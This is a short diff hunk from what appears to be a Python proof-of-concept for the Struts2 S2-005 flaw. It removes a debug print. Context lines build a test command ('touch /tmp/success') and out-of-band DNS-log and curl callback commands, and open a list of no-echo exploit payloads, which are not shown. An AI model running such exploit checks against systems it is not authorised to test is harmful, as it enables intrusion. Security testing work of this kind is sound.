@@ -30,7 +30,6 @@ def poc(url):
 	command = "touch /tmp/success"
 	mydnslog = Dnslog("s2005")
 	dnslog_cmd = mydnslog.getCommand("dns")
-	print(dnslog_cmd)
 	web_curl_cmd = mydnslog.getCommand("web_curl")
 	payloads = [
 		 # 无回显payload
